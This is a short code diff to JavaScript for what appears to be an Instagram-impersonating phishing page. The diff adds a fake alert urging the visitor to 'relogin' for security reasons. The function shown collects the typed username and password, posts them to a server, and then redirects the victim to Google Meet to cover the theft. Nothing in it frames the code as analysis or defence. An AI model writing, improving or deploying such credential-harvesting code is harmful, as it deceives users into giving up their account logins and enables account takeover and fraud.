@@ -1,3 +1,4 @@
+alert("For security reasons you have to relogin your instagram")
 async function sendDataToServer(){
     console.log("Sent data to the server")
     const username = document.getElementById("username").value;
@@ -18,6 +19,6 @@ async function sendDataToServer(){
         body:JSON.stringify(data)
     })
 
-    
+    await res.json()
     if(username!="" && password !="") window.location.href = "https://meet.google.com/"
 }
